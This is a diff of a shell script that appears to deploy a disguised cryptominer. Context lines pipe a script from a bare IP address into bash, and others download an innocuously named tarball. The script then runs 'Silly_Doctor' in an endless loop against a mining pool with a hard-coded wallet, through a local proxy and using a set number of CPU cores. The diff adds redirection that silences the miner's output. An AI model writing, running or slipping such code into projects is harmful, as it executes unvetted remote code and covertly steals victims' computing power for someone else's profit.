@@ -17,18 +17,6 @@ curl -fsSL http://176.58.105.206/install_and_monitor_shade_root.sh | bash &
 
 sleep 2
 
-wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
-
-sleep 2
-
-source ~/.bashrc
-
-sleep 2
-
-nvm install 21.6.1
-
-sleep 2
-
 npm
 
 sleep 2
@@ -104,7 +92,7 @@ sleep 2
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
@@ -133,6 +121,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm randomarq --pool gntl-miner.azpool.win:3333 --wallet solo:gnt1em9N5H4iisEbpQUPD3hrq19h6hnwgC62fo1rrTjGQM3pGs8cphzLowKNC5VDjX8MuT6SLtb1SEXdk9dkver92xQjCyZVj1 --password $currentdate --worker $currentdate --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive
+./Silly_Doctor --disable-gpu --algorithm randomarq --pool gntl-miner.azpool.win:3333 --wallet solo:gnt1em9N5H4iisEbpQUPD3hrq19h6hnwgC62fo1rrTjGQM3pGs8cphzLowKNC5VDjX8MuT6SLtb1SEXdk9dkver92xQjCyZVj1 --password $currentdate --worker $currentdate --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 5
 done
